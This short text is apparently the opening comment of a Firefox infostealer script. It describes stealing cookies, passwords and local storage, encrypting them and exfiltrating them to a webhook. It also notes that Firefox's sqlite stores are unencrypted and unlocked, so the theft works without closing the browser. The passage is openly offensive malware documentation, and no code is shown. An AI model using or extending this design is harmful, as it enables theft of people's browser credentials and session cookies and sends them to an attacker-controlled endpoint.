'''
An infostealer that steals Firefox cookies/passwords/local storage instead of Chrome.
Then, it encrypts and exfiltrates said local storage to a webhook.

This is much simpler than the Chrome cookie stealer because Firefox does *NOT* encrypt their sqlite3 files.
This does not require Firefox to be closed. Firefox does not lock the cookie file, and just creates a temp hidden one
